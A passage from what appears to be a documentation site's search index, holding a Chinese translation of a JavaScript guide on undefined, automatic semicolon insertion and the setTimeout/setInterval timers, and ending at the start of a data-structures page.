<code>undefined</code>\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#undefined","title":"<code>undefined</code> \u7684\u503c","text":"<p><code>undefined</code> \u662f\u4e00\u4e2a\u503c\u4e3a <code>undefined</code> \u7684\u7c7b\u578b\u3002</p> <p>\u8fd9\u4e2a\u8bed\u8a00\u4e5f\u5b9a\u4e49\u4e86\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u5b83\u7684\u503c\u662f <code>undefined</code>\uff0c\u8fd9\u4e2a\u53d8\u91cf\u4e5f\u88ab\u79f0\u4e3a <code>undefined</code>\u3002 \u4f46\u662f\u8fd9\u4e2a\u53d8\u91cf**\u4e0d\u662f**\u4e00\u4e2a\u5e38\u91cf\uff0c\u4e5f\u4e0d\u662f\u4e00\u4e2a\u5173\u952e\u5b57\u3002\u8fd9\u610f\u5473\u7740\u5b83\u7684_\u503c_\u53ef\u4ee5\u8f7b\u6613\u88ab\u8986\u76d6\u3002</p> <p>ES5 \u63d0\u793a: \u5728 ECMAScript 5 \u7684\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c<code>undefined</code> \u4e0d\u518d\u662f _\u53ef\u5199_\u7684\u4e86\u3002 \u4f46\u662f\u5b83\u7684\u540d\u79f0\u4ecd\u7136\u53ef\u4ee5\u88ab\u9690\u85cf\uff0c\u6bd4\u5982\u5b9a\u4e49\u4e00\u4e2a\u51fd\u6570\u540d\u4e3a <code>undefined</code>\u3002</p> <p>\u4e0b\u9762\u7684\u60c5\u51b5\u4f1a\u8fd4\u56de <code>undefined</code> \u503c\uff1a</p> <ul> <li>\u8bbf\u95ee\u672a\u4fee\u6539\u7684\u5168\u5c40\u53d8\u91cf <code>undefined</code>\u3002</li> <li>\u7531\u4e8e\u6ca1\u6709\u5b9a\u4e49 <code>return</code> \u8868\u8fbe\u5f0f\u7684\u51fd\u6570\u9690\u5f0f\u8fd4\u56de\u3002</li> <li><code>return</code> \u8868\u8fbe\u5f0f\u6ca1\u6709\u663e\u5f0f\u7684\u8fd4\u56de\u4efb\u4f55\u5185\u5bb9\u3002</li> <li>\u8bbf\u95ee\u4e0d\u5b58\u5728\u7684\u5c5e\u6027\u3002</li> <li>\u51fd\u6570\u53c2\u6570\u6ca1\u6709\u88ab\u663e\u5f0f\u7684\u4f20\u9012\u503c\u3002</li> <li>\u4efb\u4f55\u88ab\u8bbe\u7f6e\u4e3a <code>undefined</code> \u503c\u7684\u53d8\u91cf\u3002</li> </ul>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#undefined_1","title":"\u5904\u7406 <code>undefined</code> \u503c\u7684\u6539\u53d8","text":"<p>\u7531\u4e8e\u5168\u5c40\u53d8\u91cf <code>undefined</code> \u53ea\u662f\u4fdd\u5b58\u4e86 <code>undefined</code> \u7c7b\u578b\u5b9e\u9645_\u503c_\u7684\u526f\u672c\uff0c \u56e0\u6b64\u5bf9\u5b83\u8d4b\u65b0\u503c**\u4e0d\u4f1a**\u6539\u53d8\u7c7b\u578b <code>undefined</code> \u7684\u503c\u3002</p> <p>\u7136\u800c\uff0c\u4e3a\u4e86\u65b9\u4fbf\u5176\u5b83\u53d8\u91cf\u548c <code>undefined</code> \u505a\u6bd4\u8f83\uff0c\u6211\u4eec\u9700\u8981\u4e8b\u5148\u83b7\u53d6\u7c7b\u578b <code>undefined</code> \u7684\u503c\u3002</p> <p>\u4e3a\u4e86\u907f\u514d\u53ef\u80fd\u5bf9 <code>undefined</code> \u503c\u7684\u6539\u53d8\uff0c\u4e00\u4e2a\u5e38\u7528\u7684\u6280\u5de7\u662f\u4f7f\u7528\u4e00\u4e2a\u4f20\u9012\u5230\u533f\u540d\u5305\u88c5\u5668\u7684\u989d\u5916\u53c2\u6570\u3002 \u5728\u8c03\u7528\u65f6\uff0c\u8fd9\u4e2a\u53c2\u6570\u4e0d\u4f1a\u83b7\u53d6\u4efb\u4f55\u503c\u3002</p> <pre><code>var undefined = 123;\n(function(something, foo, undefined) {\n    // \u5c40\u90e8\u4f5c\u7528\u57df\u91cc\u7684 undefined \u53d8\u91cf\u91cd\u65b0\u83b7\u5f97\u4e86 `undefined` \u503c\n\n})('Hello World', 42);\n</code></pre> <p>\u53e6\u5916\u4e00\u79cd\u8fbe\u5230\u76f8\u540c\u76ee\u7684\u65b9\u6cd5\u662f\u5728\u51fd\u6570\u5185\u4f7f\u7528\u53d8\u91cf\u58f0\u660e\u3002</p> <pre><code>var undefined = 123;\n(function(something, foo) {\n    var undefined;\n    ...\n\n})('Hello World', 42);\n</code></pre> <p>\u8fd9\u91cc\u552f\u4e00\u7684\u533a\u522b\u662f\uff0c\u5728\u538b\u7f29\u540e\u5e76\u4e14\u51fd\u6570\u5185\u6ca1\u6709\u5176\u5b83\u9700\u8981\u4f7f\u7528 <code>var</code> \u58f0\u660e\u53d8\u91cf\u7684\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a\u7248\u672c\u7684\u4ee3\u7801\u4f1a\u591a\u51fa 4 \u4e2a\u5b57\u8282\u7684\u4ee3\u7801\u3002</p> <p>**\u8bd1\u8005\u6ce8\uff1a**\u8fd9\u91cc\u6709\u70b9\u7ed5\u53e3\uff0c\u5176\u5b9e\u5f88\u7b80\u5355\u3002\u5982\u679c\u6b64\u51fd\u6570\u5185\u6ca1\u6709\u5176\u5b83\u9700\u8981\u58f0\u660e\u7684\u53d8\u91cf\uff0c\u90a3\u4e48 <code>var</code>\u603b\u5171 4 \u4e2a\u5b57\u7b26\uff08\u5305\u542b\u4e00\u4e2a\u7a7a\u767d\u5b57\u7b26\uff09 \u5c31\u662f\u4e13\u95e8\u4e3a <code>undefined</code> \u53d8\u91cf\u51c6\u5907\u7684\uff0c\u76f8\u6bd4\u4e0a\u4e2a\u4f8b\u5b50\u591a\u51fa\u4e86 4 \u4e2a\u5b57\u8282\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#null","title":"<code>null</code> \u7684\u7528\u5904","text":"<p>JavaScript \u4e2d\u7684 <code>undefined</code> \u7684\u4f7f\u7528\u573a\u666f\u7c7b\u4f3c\u4e8e\u5176\u5b83\u8bed\u8a00\u4e2d\u7684 null\uff0c\u5b9e\u9645\u4e0a JavaScript \u4e2d\u7684 <code>null</code> \u662f\u53e6\u5916\u4e00\u79cd\u6570\u636e\u7c7b\u578b\u3002</p> <p>\u5b83\u5728 JavaScript \u5185\u90e8\u6709\u4e00\u4e9b\u4f7f\u7528\u573a\u666f\uff08\u6bd4\u5982\u58f0\u660e\u539f\u578b\u94fe\u7684\u7ec8\u7ed3 <code>Foo.prototype = null</code>\uff09\uff0c\u4f46\u662f\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u90fd\u53ef\u4ee5\u4f7f\u7528 <code>undefined</code> \u6765\u4ee3\u66ff\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_69","title":"\u81ea\u52a8\u5206\u53f7\u63d2\u5165","text":"<p>\u5c3d\u7ba1 JavaScript \u6709 C \u7684\u4ee3\u7801\u98ce\u683c\uff0c\u4f46\u662f\u5b83**\u4e0d**\u5f3a\u5236\u8981\u6c42\u5728\u4ee3\u7801\u4e2d\u4f7f\u7528\u5206\u53f7\uff0c\u5b9e\u9645\u4e0a\u53ef\u4ee5\u7701\u7565\u5b83\u4eec\u3002</p> <p>JavaScript \u4e0d\u662f\u4e00\u4e2a\u6ca1\u6709\u5206\u53f7\u7684\u8bed\u8a00\uff0c\u6070\u6070\u76f8\u53cd\u4e0a\u5b83\u9700\u8981\u5206\u53f7\u6765\u5c31\u89e3\u6790\u6e90\u4ee3\u7801\u3002 \u56e0\u6b64 JavaScript \u89e3\u6790\u5668\u5728\u9047\u5230\u7531\u4e8e\u7f3a\u5c11\u5206\u53f7\u5bfc\u81f4\u7684\u89e3\u6790\u9519\u8bef\u65f6\uff0c\u4f1a**\u81ea\u52a8**\u5728\u6e90\u4ee3\u7801\u4e2d\u63d2\u5165\u5206\u53f7\u3002</p> <pre><code>var foo = function() {\n} // \u89e3\u6790\u9519\u8bef\uff0c\u5206\u53f7\u4e22\u5931\ntest()\n</code></pre> <p>\u81ea\u52a8\u63d2\u5165\u5206\u53f7\uff0c\u89e3\u6790\u5668\u91cd\u65b0\u89e3\u6790\u3002</p> <pre><code>var foo = function() {\n}; // \u6ca1\u6709\u9519\u8bef\uff0c\u89e3\u6790\u7ee7\u7eed\ntest()\n</code></pre> <p>\u81ea\u52a8\u7684\u5206\u53f7\u63d2\u5165\u88ab\u8ba4\u4e3a\u662f JavaScript \u8bed\u8a00**\u6700\u5927**\u7684\u8bbe\u8ba1\u7f3a\u9677\u4e4b\u4e00\uff0c\u56e0\u4e3a\u5b83_\u80fd_\u6539\u53d8\u4ee3\u7801\u7684\u884c\u4e3a\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_70","title":"\u5de5\u4f5c\u539f\u7406","text":"<p>\u4e0b\u9762\u7684\u4ee3\u7801\u6ca1\u6709\u5206\u53f7\uff0c\u56e0\u6b64\u89e3\u6790\u5668\u9700\u8981\u81ea\u5df1\u5224\u65ad\u9700\u8981\u5728\u54ea\u4e9b\u5730\u65b9\u63d2\u5165\u5206\u53f7\u3002</p> <pre><code>(function(window, undefined) {\n    function test(options) {\n        log('testing!')\n\n        (options.list || []).forEach(function(i) {\n\n        })\n\n        options.value.test(\n            'long string to pass here',\n            'and another long string to pass'\n        )\n\n        return\n        {\n            foo: function() {}\n        }\n    }\n    window.test = test\n\n})(window)\n\n(function(window) {\n    window.someLibrary = {}\n})(window)\n</code></pre> <p>\u4e0b\u9762\u662f\u89e3\u6790\u5668\"\u731c\u6d4b\"\u7684\u7ed3\u679c\u3002</p> <pre><code>(function(window, undefined) {\n    function test(options) {\n\n        // \u6ca1\u6709\u63d2\u5165\u5206\u53f7\uff0c\u4e24\u884c\u88ab\u5408\u5e76\u4e3a\u4e00\u884c\n        log('testing!')(options.list || []).forEach(function(i) {\n\n        }); // &lt;- \u63d2\u5165\u5206\u53f7\n\n        options.value.test(\n            'long string to pass here',\n            'and another long string to pass'\n        ); // &lt;- \u63d2\u5165\u5206\u53f7\n\n        return; // &lt;- \u63d2\u5165\u5206\u53f7, \u6539\u53d8\u4e86 return \u8868\u8fbe\u5f0f\u7684\u884c\u4e3a\n        { // \u4f5c\u4e3a\u4e00\u4e2a\u4ee3\u7801\u6bb5\u5904\u7406\n            foo: function() {} \n        }; // &lt;- \u63d2\u5165\u5206\u53f7\n    }\n    window.test = test; // &lt;- \u63d2\u5165\u5206\u53f7\n\n// \u4e24\u884c\u53c8\u88ab\u5408\u5e76\u4e86\n})(window)(function(window) {\n    window.someLibrary = {}; // &lt;- \u63d2\u5165\u5206\u53f7\n})(window); //&lt;- \u63d2\u5165\u5206\u53f7\n</code></pre> <p>\u6ce8\u610f: JavaScript \u4e0d\u80fd\u6b63\u786e\u7684\u5904\u7406 <code>return</code> \u8868\u8fbe\u5f0f\u7d27\u8ddf\u6362\u884c\u7b26\u7684\u60c5\u51b5\uff0c \u867d\u7136\u8fd9\u4e0d\u80fd\u7b97\u662f\u81ea\u52a8\u5206\u53f7\u63d2\u5165\u7684\u9519\u8bef\uff0c\u4f46\u8fd9\u786e\u5b9e\u662f\u4e00\u79cd\u4e0d\u5e0c\u671b\u7684\u526f\u4f5c\u7528\u3002</p> <p>\u89e3\u6790\u5668\u663e\u8457\u6539\u53d8\u4e86\u4e0a\u9762\u4ee3\u7801\u7684\u884c\u4e3a\uff0c\u5728\u53e6\u5916\u4e00\u4e9b\u60c5\u51b5\u4e0b\u4e5f\u4f1a\u505a\u51fa**\u9519\u8bef\u7684\u5904\u7406**\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_71","title":"\u524d\u7f6e\u62ec\u53f7","text":"<p>\u5728\u524d\u7f6e\u62ec\u53f7\u7684\u60c5\u51b5\u4e0b\uff0c\u89e3\u6790\u5668**\u4e0d\u4f1a**\u81ea\u52a8\u63d2\u5165\u5206\u53f7\u3002</p> <pre><code>log('testing!')\n(options.list || []).forEach(function(i) {})\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u88ab\u89e3\u6790\u5668\u8f6c\u6362\u4e3a\u4e00\u884c\u3002</p> <pre><code>log('testing!')(options.list || []).forEach(function(i) {})\n</code></pre> <p><code>log</code> \u51fd\u6570\u7684\u6267\u884c\u7ed3\u679c**\u6781\u5927**\u53ef\u80fd**\u4e0d\u662f**\u51fd\u6570\uff1b\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5c31\u4f1a\u51fa\u73b0 <code>TypeError</code> \u7684\u9519\u8bef\uff0c\u8be6\u7ec6\u9519\u8bef\u4fe1\u606f\u53ef\u80fd\u662f <code>undefined is not a function</code>\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_72","title":"\u7ed3\u8bba","text":"<p>\u5efa\u8bae**\u7edd\u5bf9**\u4e0d\u8981\u7701\u7565\u5206\u53f7\uff0c\u540c\u65f6\u4e5f\u63d0\u5021\u5c06\u82b1\u62ec\u53f7\u548c\u76f8\u5e94\u7684\u8868\u8fbe\u5f0f\u653e\u5728\u4e00\u884c\uff0c \u5bf9\u4e8e\u53ea\u6709\u4e00\u884c\u4ee3\u7801\u7684 <code>if</code> \u6216\u8005 <code>else</code> \u8868\u8fbe\u5f0f\uff0c\u4e5f\u4e0d\u5e94\u8be5\u7701\u7565\u82b1\u62ec\u53f7\u3002 \u8fd9\u4e9b\u826f\u597d\u7684\u7f16\u7a0b\u4e60\u60ef\u4e0d\u4ec5\u53ef\u4ee5\u63d0\u5230\u4ee3\u7801\u7684\u4e00\u81f4\u6027\uff0c\u800c\u4e14\u53ef\u4ee5\u9632\u6b62\u89e3\u6790\u5668\u6539\u53d8\u4ee3\u7801\u884c\u4e3a\u7684\u9519\u8bef\u5904\u7406\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_73","title":"\u5176\u5b83","text":""},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#settimeout-setinterval","title":"<code>setTimeout</code> \u548c <code>setInterval</code>","text":"<p>\u7531\u4e8e JavaScript \u662f\u5f02\u6b65\u7684\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>setTimeout</code> \u548c <code>setInterval</code> \u6765\u8ba1\u5212\u6267\u884c\u51fd\u6570\u3002</p> <p>\u6ce8\u610f: \u5b9a\u65f6\u5904\u7406**\u4e0d\u662f**ECMAScript \u7684\u6807\u51c6\uff0c\u5b83\u4eec\u5728 DOM (\u6587\u6863\u5bf9\u8c61\u6a21\u578b) \u88ab\u5b9e\u73b0\u3002</p> <pre><code>function foo() {}\nvar id = setTimeout(foo, 1000); // \u8fd4\u56de\u4e00\u4e2a\u5927\u4e8e\u96f6\u7684\u6570\u5b57\n</code></pre> <p>\u5f53 <code>setTimeout</code> \u88ab\u8c03\u7528\u65f6\uff0c\u5b83\u4f1a\u8fd4\u56de\u4e00\u4e2a ID \u6807\u8bc6\u5e76\u4e14\u8ba1\u5212\u5728\u5c06\u6765**\u5927\u7ea6** 1000 \u6beb\u79d2\u540e\u8c03\u7528 <code>foo</code> \u51fd\u6570\u3002 <code>foo</code> \u51fd\u6570\u53ea\u4f1a\u88ab\u6267\u884c**\u4e00\u6b21**\u3002</p> <p>\u57fa\u4e8e JavaScript \u5f15\u64ce\u7684\u8ba1\u65f6\u7b56\u7565\uff0c\u4ee5\u53ca\u672c\u8d28\u4e0a\u7684\u5355\u7ebf\u7a0b\u8fd0\u884c\u65b9\u5f0f\uff0c\u6240\u4ee5\u5176\u5b83\u4ee3\u7801\u7684\u8fd0\u884c\u53ef\u80fd\u4f1a\u963b\u585e\u6b64\u7ebf\u7a0b\u3002 \u56e0\u6b64**\u6ca1\u6cd5\u786e\u4fdd**\u51fd\u6570\u4f1a\u5728 <code>setTimeout</code> \u6307\u5b9a\u7684\u65f6\u523b\u88ab\u8c03\u7528\u3002</p> <p>\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684\u51fd\u6570\u5c06\u4f1a\u5728_\u5168\u5c40\u4f5c\u7528\u57df_\u4e2d\u6267\u884c\uff0c\u56e0\u6b64\u51fd\u6570\u5185\u7684 <code>this</code> \u5c06\u4f1a\u6307\u5411\u8fd9\u4e2a\u5168\u5c40\u5bf9\u8c61\u3002</p> <pre><code>function Foo() {\n    this.value = 42;\n    this.method = function() {\n        // this \u6307\u5411\u5168\u5c40\u5bf9\u8c61\n        console.log(this.value); // \u8f93\u51fa\uff1aundefined\n    };\n    setTimeout(this.method, 500);\n}\nnew Foo();\n</code></pre> <p>\u6ce8\u610f: <code>setTimeout</code> \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f**\u51fd\u6570\u5bf9\u8c61**\uff0c\u4e00\u4e2a\u5e38\u72af\u7684\u9519\u8bef\u662f\u8fd9\u6837\u7684 <code>setTimeout(foo(), 1000)</code>\uff0c \u8fd9\u91cc\u56de\u8c03\u51fd\u6570\u662f <code>foo</code> \u7684**\u8fd4\u56de\u503c**\uff0c\u800c**\u4e0d\u662f**<code>foo</code>\u672c\u8eab\u3002 \u5927\u90e8\u5206\u60c5\u51b5\u4e0b\uff0c\u8fd9\u662f\u4e00\u4e2a\u6f5c\u5728\u7684\u9519\u8bef\uff0c\u56e0\u4e3a\u5982\u679c\u51fd\u6570\u8fd4\u56de <code>undefined</code>\uff0c<code>setTimeout</code> \u4e5f**\u4e0d\u4f1a**\u62a5\u9519\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#setinterval","title":"<code>setInterval</code> \u7684\u5806\u8c03\u7528","text":"<p><code>setTimeout</code> \u53ea\u4f1a\u6267\u884c\u56de\u8c03\u51fd\u6570\u4e00\u6b21\uff0c\u4e0d\u8fc7 <code>setInterval</code> - \u6b63\u5982\u540d\u5b57\u5efa\u8bae\u7684 - \u4f1a\u6bcf\u9694 <code>X</code> \u6beb\u79d2\u6267\u884c\u51fd\u6570\u4e00\u6b21\u3002 \u4f46\u662f\u5374\u4e0d\u9f13\u52b1\u4f7f\u7528\u8fd9\u4e2a\u51fd\u6570\u3002</p> <p>\u5f53\u56de\u8c03\u51fd\u6570\u7684\u6267\u884c\u88ab\u963b\u585e\u65f6\uff0c<code>setInterval</code> \u4ecd\u7136\u4f1a\u53d1\u5e03\u66f4\u591a\u7684\u56de\u8c03\u6307\u4ee4\u3002\u5728\u5f88\u5c0f\u7684\u5b9a\u65f6\u95f4\u9694\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4f1a\u5bfc\u81f4\u56de\u8c03\u51fd\u6570\u88ab\u5806\u79ef\u8d77\u6765\u3002</p> <pre><code>function foo(){\n    // \u963b\u585e\u6267\u884c 1 \u79d2\n}\nsetInterval(foo, 100);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>foo</code> \u4f1a\u6267\u884c\u4e00\u6b21\u968f\u540e\u88ab\u963b\u585e\u4e86\u4e00\u79d2\u949f\u3002</p> <p>\u5728 <code>foo</code> \u88ab\u963b\u585e\u7684\u65f6\u5019\uff0c<code>setInterval</code> \u4ecd\u7136\u5728\u7ec4\u7ec7\u5c06\u6765\u5bf9\u56de\u8c03\u51fd\u6570\u7684\u8c03\u7528\u3002 \u56e0\u6b64\uff0c\u5f53\u7b2c\u4e00\u6b21 <code>foo</code> \u51fd\u6570\u8c03\u7528\u7ed3\u675f\u65f6\uff0c\u5df2\u7ecf\u6709 10 \u6b21\u51fd\u6570\u8c03\u7528\u5728\u7b49\u5f85\u6267\u884c\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_74","title":"\u5904\u7406\u53ef\u80fd\u7684\u963b\u585e\u8c03\u7528","text":"<p>\u6700\u7b80\u5355\u4e5f\u662f\u6700\u5bb9\u6613\u63a7\u5236\u7684\u65b9\u6848\uff0c\u662f\u5728\u56de\u8c03\u51fd\u6570\u5185\u90e8\u4f7f\u7528 <code>setTimeout</code> \u51fd\u6570\u3002</p> <pre><code>function foo(){\n    // \u963b\u585e\u6267\u884c 1 \u79d2\n    setTimeout(foo, 100);\n}\nfoo();\n</code></pre> <p>\u8fd9\u6837\u4e0d\u4ec5\u5c01\u88c5\u4e86 <code>setTimeout</code> \u56de\u8c03\u51fd\u6570\uff0c\u800c\u4e14\u963b\u6b62\u4e86\u8c03\u7528\u6307\u4ee4\u7684\u5806\u79ef\uff0c\u53ef\u4ee5\u6709\u66f4\u591a\u7684\u63a7\u5236\u3002 <code>foo</code> \u51fd\u6570\u73b0\u5728\u53ef\u4ee5\u63a7\u5236\u662f\u5426\u7ee7\u7eed\u6267\u884c\u8fd8\u662f\u7ec8\u6b62\u6267\u884c\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_75","title":"\u624b\u5de5\u6e05\u7a7a\u5b9a\u65f6\u5668","text":"<p>\u53ef\u4ee5\u901a\u8fc7\u5c06\u5b9a\u65f6\u65f6\u4ea7\u751f\u7684 ID \u6807\u8bc6\u4f20\u9012\u7ed9 <code>clearTimeout</code> \u6216\u8005 <code>clearInterval</code> \u51fd\u6570\u6765\u6e05\u9664\u5b9a\u65f6\uff0c \u81f3\u4e8e\u4f7f\u7528\u54ea\u4e2a\u51fd\u6570\u53d6\u51b3\u4e8e\u8c03\u7528\u7684\u65f6\u5019\u4f7f\u7528\u7684\u662f <code>setTimeout</code> \u8fd8\u662f <code>setInterval</code>\u3002</p> <pre><code>var id = setTimeout(foo, 1000);\nclearTimeout(id);\n</code></pre>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_76","title":"\u6e05\u9664\u6240\u6709\u5b9a\u65f6\u5668","text":"<p>\u7531\u4e8e\u6ca1\u6709\u5185\u7f6e\u7684\u6e05\u9664\u6240\u6709\u5b9a\u65f6\u5668\u7684\u65b9\u6cd5\uff0c\u53ef\u4ee5\u91c7\u7528\u4e00\u79cd\u66b4\u529b\u7684\u65b9\u5f0f\u6765\u8fbe\u5230\u8fd9\u4e00\u76ee\u7684\u3002</p> <pre><code>// \u6e05\u7a7a\"\u6240\u6709\"\u7684\u5b9a\u65f6\u5668\nfor(var i = 1; i &lt; 1000; i++) {\n    clearTimeout(i);\n}\n</code></pre> <p>\u53ef\u80fd\u8fd8\u6709\u4e9b\u5b9a\u65f6\u5668\u4e0d\u4f1a\u5728\u4e0a\u9762\u4ee3\u7801\u4e2d\u88ab\u6e05\u9664\uff08**\u8bd1\u8005\u6ce8\uff1a**\u5982\u679c\u5b9a\u65f6\u5668\u8c03\u7528\u65f6\u8fd4\u56de\u7684 ID \u503c\u5927\u4e8e 1000\uff09\uff0c \u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u4e8b\u5148\u4fdd\u5b58\u6240\u6709\u7684\u5b9a\u65f6\u5668 ID\uff0c\u7136\u540e\u4e00\u628a\u6e05\u9664\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#eval_2","title":"\u9690\u85cf\u4f7f\u7528 <code>eval</code>","text":"<p><code>setTimeout</code> \u548c <code>setInterval</code> \u4e5f\u63a5\u53d7\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u5b57\u7b26\u4e32\u7684\u60c5\u51b5\u3002 \u8fd9\u4e2a\u7279\u6027**\u7edd\u5bf9**\u4e0d\u8981\u4f7f\u7528\uff0c\u56e0\u4e3a\u5b83\u5728\u5185\u90e8\u4f7f\u7528\u4e86 <code>eval</code>\u3002</p> <p>\u6ce8\u610f: \u7531\u4e8e\u5b9a\u65f6\u5668\u51fd\u6570\u4e0d\u662f ECMAScript \u7684\u6807\u51c6\uff0c\u5982\u4f55\u89e3\u6790\u5b57\u7b26\u4e32\u53c2\u6570\u5728\u4e0d\u540c\u7684 JavaScript \u5f15\u64ce\u5b9e\u73b0\u4e2d\u53ef\u80fd\u4e0d\u540c\u3002 \u4e8b\u5b9e\u4e0a\uff0c\u5fae\u8f6f\u7684 JScript \u4f1a\u4f7f\u7528 <code>Function</code> \u6784\u9020\u51fd\u6570\u6765\u4ee3\u66ff <code>eval</code> \u7684\u4f7f\u7528\u3002</p> <pre><code>function foo() {\n    // \u5c06\u4f1a\u88ab\u8c03\u7528\n}\n\nfunction bar() {\n    function foo() {\n        // \u4e0d\u4f1a\u88ab\u8c03\u7528\n    }\n    setTimeout('foo()', 1000);\n}\nbar();\n</code></pre> <p>\u7531\u4e8e <code>eval</code> \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u4e0d\u662f\u88ab\u76f4\u63a5\u8c03\u7528\uff0c\u56e0\u6b64\u4f20\u9012\u5230 <code>setTimeout</code> \u7684\u5b57\u7b26\u4e32\u4f1a\u81ea_\u5168\u5c40\u4f5c\u7528\u57df_\u4e2d\u6267\u884c\uff1b \u56e0\u6b64\uff0c\u4e0a\u9762\u7684\u56de\u8c03\u51fd\u6570\u4f7f\u7528\u7684\u4e0d\u662f\u5b9a\u4e49\u5728 <code>bar</code> \u4f5c\u7528\u57df\u4e2d\u7684\u5c40\u90e8\u53d8\u91cf <code>foo</code>\u3002</p> <p>\u5efa\u8bae**\u4e0d\u8981**\u5728\u8c03\u7528\u5b9a\u65f6\u5668\u51fd\u6570\u65f6\uff0c\u4e3a\u4e86\u5411\u56de\u8c03\u51fd\u6570\u4f20\u9012\u53c2\u6570\u800c\u4f7f\u7528\u5b57\u7b26\u4e32\u7684\u5f62\u5f0f\u3002</p> <pre><code>function foo(a, b, c) {}\n\n// \u4e0d\u8981\u8fd9\u6837\u505a\nsetTimeout('foo(1,2, 3)', 1000)\n\n// \u53ef\u4ee5\u4f7f\u7528\u533f\u540d\u51fd\u6570\u5b8c\u6210\u76f8\u540c\u529f\u80fd\nsetTimeout(function() {\n    foo(1, 2, 3);\n}, 1000)\n</code></pre> <p>\u6ce8\u610f: \u867d\u7136\u4e5f\u53ef\u4ee5\u4f7f\u7528\u8fd9\u6837\u7684\u8bed\u6cd5 <code>setTimeout(foo, 1000, 1, 2, 3)</code>\uff0c \u4f46\u662f\u4e0d\u63a8\u8350\u8fd9\u4e48\u505a\uff0c\u56e0\u4e3a\u5728\u4f7f\u7528\u5bf9\u8c61\u7684\u5c5e\u6027\u65b9\u6cd5\u65f6\u53ef\u80fd\u4f1a\u51fa\u9519\u3002 \uff08**\u8bd1\u8005\u6ce8\uff1a**\u8fd9\u91cc\u8bf4\u7684\u662f\u5c5e\u6027\u65b9\u6cd5\u5185\uff0c<code>this</code>\u7684\u6307\u5411\u9519\u8bef\uff09</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_77","title":"\u7ed3\u8bba","text":"<p>**\u7edd\u5bf9\u4e0d\u8981**\u4f7f\u7528\u5b57\u7b26\u4e32\u4f5c\u4e3a <code>setTimeout</code> \u6216\u8005 <code>setInterval</code> \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c \u8fd9\u4e48\u5199\u7684\u4ee3\u7801\u660e\u663e\u8d28\u91cf\u5f88\u5dee\u3002\u5f53\u9700\u8981\u5411\u56de\u8c03\u51fd\u6570\u4f20\u9012\u53c2\u6570\u65f6\uff0c\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a_\u533f\u540d\u51fd\u6570_\uff0c\u5728\u51fd\u6570\u5185\u6267\u884c\u771f\u5b9e\u7684\u56de\u8c03\u51fd\u6570\u3002</p> <p>\u53e6\u5916\uff0c\u5e94\u8be5\u907f\u514d\u4f7f\u7528 <code>setInterval</code>\uff0c\u56e0\u4e3a\u5b83\u7684\u5b9a\u65f6\u6267\u884c\u4e0d\u4f1a\u88ab JavaScript \u963b\u585e\u3002</p>"},{"location":"other/data%20structure%20basic/","title":"data structure basic","text":""},{"location":"other/data%20structure%20basic/#_1","title":"\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 62245  \u9605\u8bfb125\u5206\u949f</p> <p>\u6570\u636e\u7ed3\u6784\uff1a\u7814\u7a76\u6570\u636e\u7684\u903b\u8f91\u7ed3\u6784\u548c\u7269\u7406\u7ed3\u6784\u4ee5\u53ca\u5b83\u4eec\u4e4b\u95f4\u76f8\u4e92\u5173\u7cfb\uff0c\u5e76\u5bf9\u8fd9\u79cd\u7ed3\u6784\u5b9a\u4e49\u76f8\u5e94\u7684\u8fd0\u7b97\uff0c\u800c\u4e14\u786e\u4fdd\u7ecf\u8fc7\u8fd9\u4e9b\u8fd0\u7b97\u540e\u6240\u5f97\u5230\u7684\u65b0\u7ed3\u6784\u4ecd\u7136\u662f\u539f\u6765\u7684\u7ed3\u6784\u7c7b\u578b\u3002</p> 